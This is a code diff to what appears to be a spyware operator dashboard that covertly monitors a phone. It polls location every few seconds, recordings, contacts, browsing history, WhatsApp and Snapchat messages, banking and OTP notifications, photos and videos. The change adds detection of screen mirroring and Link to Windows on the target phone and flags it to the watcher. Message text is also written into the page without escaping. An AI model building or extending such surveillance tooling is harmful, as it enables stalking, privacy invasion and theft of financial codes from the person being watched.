@@ -317,7 +317,9 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swWifi">&#x1F4E1; --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swSignal"><span class="wifi-signal"></span> --</span>
   <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swFgs">&#x2699; FGS --</span>
+  <span class="chip" style="background:var(--bg);border-color:var(--border);color:var(--muted)" id="swMirror">&#x1F5A5; Mirror --</span>
 </div>
+<div id="mirrorDetail" style="font-size:11px;color:var(--muted);margin-top:4px"></div>
 </div>
 <div id="tab-recents">
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:4px">
@@ -406,6 +408,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span class="chip" data-filter="whatsapp_group" data-label="&#x1F465; Groups">&#x1F465; Groups</span>
 <span class="chip" data-filter="snapchat" data-label="&#x1F4F8; Snapchat">&#x1F4F8; Snapchat</span>
 <span class="chip" data-filter="banking" data-label="&#x1F4B3; Banking">&#x1F4B3; Banking</span>
+<span class="chip" data-filter="mirroring" data-label="&#x1F5A5; Mirroring">&#x1F5A5; Mirroring</span>
 </div>
 <div style="display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap">
 <select id="timelinePeriod" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 8px;border-radius:var(--radius);font-size:13px">
@@ -1205,7 +1208,7 @@ let playbackLoop = false;
 
 // --- Poll Timers ---
 let pollTimers = [];
-const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000 };
+const BASE_INTERVALS = { loc: 3000, hist: 600000, meta: 30000, apps: 300000, voice: 300000, fcm: 60000, contacts: 3600000, perms: 3600000, logcat: 300000, remote: 30000, photos: 600000, videos: 60000, health: 3600000, mirror: 10000 };
 let intervals = { ...BASE_INTERVALS };
 
 // --- Init Map ---
@@ -2602,6 +2605,7 @@ function startPolling() {
   schedulePoll('wifi', 60000, pollWifiScans);
   schedulePoll('logcat', 60000, pollLogcat);
   schedulePoll('health', intervals.health, pollHealth);
+  schedulePoll('mirror', intervals.mirror, pollMirroring);
   schedulePoll('photos', intervals.photos, pollPhotos);
   schedulePoll('videos', 60000, pollVideos);
 }
@@ -2615,7 +2619,7 @@ function schedulePoll(name, interval, fn) {
 }
 
 async function pollAll() {
-  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos()];
+  const fns = [pollLocation(), pollMeta(), pollAppSnapshots(), pollHistory(), pollVoiceNotes(), pollRemoteRecordings(), pollContacts(), pollFcmToken(), pollQueueSize(), pollBrowserHistory(), pollPermissions(), pollWifiScans(), pollLogcat(), pollHealth(), pollVideos(), pollPhotos(), pollMirroring()];
   for (const fn of fns) { try { await fn; } catch {} }
 }
 
@@ -2833,6 +2837,62 @@ async function pollMeta() {
     document.getElementById('updatedVal').textContent = pkt(ts) + ' (phone)';
     document.getElementById('statusDot').textContent = '\u25CF Live';
     document.getElementById('statusDot').className = 'status';
+  }
+}
+
+// --- Screen mirroring / Link to Windows live status ---
+let mirrorPrevActive = false;
+
+async function pollMirroring() {
+  if (!selectedDevice) return;
+  const chip = document.getElementById('swMirror');
+  if (!chip) return;
+  const detailEl = document.getElementById('mirrorDetail');
+  const m = await fetchRTDB(`devices/${selectedDevice}/mirroring`);
+  if (!m || m.active === undefined) {
+    chip.textContent = '\u{1F5A5} Mirror --';
+    chip.style.borderColor = 'var(--border)';
+    chip.style.color = 'var(--muted)';
+    if (detailEl) detailEl.textContent = '';
+    mirrorPrevActive = false;
+    return;
+  }
+  const active = !!m.active;
+  const details = m.details || {};
+  const sources = m.sources || [];
+  const since = m.since_ms ? pkt(parseInt(m.since_ms, 10)) : '';
+  const link = details.link_to_windows;
+  const sv = details.smart_view;
+  const dex = details.dex;
+  const cast = details.cast;
+  let label = '\u{1F5A5} No mirroring';
+  let detail = '';
+  if (active) {
+    if (link) {
+      label = '\u{1F5A5} \u26A0 LINK TO WINDOWS' + (link.pcName ? ' \u2014 ' + link.pcName : '');
+    } else if (sv) {
+      label = '\u{1F5A5} \u26A0 Smart View' + (sv.name ? ' \u2192 "' + sv.name + '"' : '');
+    } else if (dex) {
+      label = '\u{1F5A5} \u26A0 DeX mode';
+    } else if (cast) {
+      label = '\u{1F5A5} \u26A0 Casting' + (cast.name ? ' \u2192 "' + cast.name + '"' : '');
+    } else {
+      label = '\u{1F5A5} \u26A0 Mirroring active';
+    }
+    detail = 'Active since ' + (since || '?') + (sources.length ? ' \u00B7 ' + sources.join(', ') : '');
+  }
+  if (active && !mirrorPrevActive) {
+    const devLabel = devices[selectedDevice] && devices[selectedDevice].label ? devices[selectedDevice].label : selectedDevice;
+    const who = link && link.pcName ? ' (' + link.pcName + ')' : '';
+    showAlert('\u26A0 Mirroring / Link to Windows detected on ' + devLabel + who, 'error');
+  }
+  mirrorPrevActive = active;
+  chip.textContent = label;
+  chip.style.borderColor = active ? 'var(--danger)' : 'var(--success)';
+  chip.style.color = active ? 'var(--danger)' : 'var(--success)';
+  if (detailEl) {
+    detailEl.textContent = detail;
+    detailEl.style.color = active ? 'var(--danger)' : 'var(--muted)';
   }
 }
 
@@ -5731,6 +5791,7 @@ function renderTimeline(docs) {
     if (cls === 'group') counts.whatsapp_group = (counts.whatsapp_group || 0) + 1;
     if (type.includes('snapchat')) counts.snapchat = (counts.snapchat || 0) + 1;
     if (type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction')) counts.banking = (counts.banking || 0) + 1;
+    if (type.includes('mirror')) counts.mirroring = (counts.mirroring || 0) + 1;
   }
   document.querySelectorAll('.chip[data-filter]').forEach(chip => {
     const f = chip.dataset.filter;
@@ -5752,6 +5813,7 @@ function renderTimeline(docs) {
     if (timelineFilter === 'whatsapp_group') return waIsWhatsApp(d) && waClassOf(d) === 'group';
     if (timelineFilter === 'snapchat') return type.includes('snapchat');
     if (timelineFilter === 'banking') return type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction');
+    if (timelineFilter === 'mirroring') return type.includes('mirror');
     return true;
   });
   // Dedup BEFORE pagination so identical re-posted messages collapse into ONE row
@@ -5811,23 +5873,42 @@ function renderTimeline(docs) {
     const msgs = entries.filter(e => (e.type || '').includes('whatsapp') || (e.type || '').includes('message')).length;
     const snaps = entries.filter(e => (e.type || '').includes('snapchat')).length;
     const banks = entries.filter(e => (e.type || '').includes('banking') || (e.type || '').includes('financial') || (e.type || '').includes('otp') || (e.type || '').includes('payment') || (e.type || '').includes('transaction')).length;
-    const summary = [locs ? `${locs}\u{1F4CD}` : '', calls ? `${calls}\u{1F4DE}` : '', msgs ? `${msgs}\u{1F4AC}` : '', snaps ? `${snaps}\u{1F4F8}` : '', banks ? `${banks}\u{1F4B3}` : ''].filter(Boolean).join(' ');
+    const mirr = entries.filter(e => (e.type || '').includes('mirror')).length;
+    const summary = [locs ? `${locs}\u{1F4CD}` : '', calls ? `${calls}\u{1F4DE}` : '', msgs ? `${msgs}\u{1F4AC}` : '', snaps ? `${snaps}\u{1F4F8}` : '', banks ? `${banks}\u{1F4B3}` : '', mirr ? `${mirr}\u{1F5A5}` : ''].filter(Boolean).join(' ');
     html += `<div class="tl-group"><div class="tl-day">${day}</div><div class="tl-summary">${summary}</div>`;
     for (const d of entries) {
       const type = d.type || '';
       const ts = parseInt(d.ts_ms || '0');
-      const icon = type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
+      const isMirror = type.includes('mirror');
+      const icon = isMirror ? '\u{1F5A5}' : type.includes('snapchat') ? '\u{1F4F8}' : type.includes('whatsapp') ? '\u{1F4AC}' : type.includes('call') ? '\u{1F4DE}' : type.includes('banking') || type.includes('financial') || type.includes('otp') || type.includes('payment') || type.includes('transaction') ? '\u{1F4B3}' : '\u{1F4CD}';
       const contact = d.contactName || d.contact || '';
       const msg = d.messagePreview || '';
       const dur = d.duration || '';
       const dir = d.direction || '';
+      let mirrorText = '';
+      if (isMirror && d.details) {
+        const parts = [];
+        for (const [mk, mv] of Object.entries(d.details)) {
+          if (mk === 'link_to_windows') parts.push('Link to Windows' + (mv.pcName ? ' \u2014 ' + mv.pcName : ''));
+          else if (mk === 'smart_view') parts.push('Smart View' + (mv.name ? ' \u2192 "' + mv.name + '"' : ''));
+          else if (mk === 'cast') parts.push('Cast' + (mv.name ? ' \u2192 "' + mv.name + '"' : ''));
+          else if (mk === 'dex') parts.push('DeX');
+          else if (mk === 'hdmi') parts.push('HDMI');
+        }
+        mirrorText = parts.join(', ');
+      }
+      let durText = '';
+      if (isMirror && d.duration_ms) {
+        const dm = parseInt(d.duration_ms, 10);
+        durText = dm >= 60000 ? ' \u00B7 ' + Math.round(dm / 60000) + 'm' : ' \u00B7 ' + Math.round(dm / 1000) + 's';
+      }
       const lat = d.lat, lng = d.lng;
       const isLoc = type === 'location' && lat && lng;
       const waCls = waIsWhatsApp(d) ? waClassOf(d) : '';
       const groupTag = waCls === 'group' ? ' <span class="grouptag">\u{1F465} ' + (d.groupName ? d.groupName.replace(/[\u200e\u202b\u202c\u200f*]/g, '') : 'گروپ') + '</span>' : (waCls === 'noise' ? ' <span class="grouptag" style="color:var(--muted);border-color:var(--border);background:rgba(120,120,120,.12)">· system</span>' : '');
-      html += `<div class="card"${isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')" style="cursor:pointer"` : ''}>
+      html += `<div class="card"${isLoc ? ` onclick="flyToLocation(${lat}, ${lng}, '${contact ? contact.replace(/'/g, "\\'") : pkt(ts)}')" style="cursor:pointer"` : ''}${isMirror ? ' style="border-left-color:var(--danger)"' : ''}>
         <div class="time">${icon} ${pkt(ts)}</div>
-        <div>${contact}${msg ? ': ' + msg : ''}${groupTag}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${isLoc ? ' \u{1F4CD} click to fly' : ''}</div>
+        <div>${contact}${msg ? ': ' + msg : ''}${groupTag}${dur ? ' \u2022 ' + dur + 's' : ''}${dir ? ' ['+dir+']' : ''}${isLoc ? ' \u{1F4CD} click to fly' : ''}${isMirror && mirrorText ? ' ' + mirrorText : ''}${durText}</div>
       </div>`;
     }
     html += '</div>';
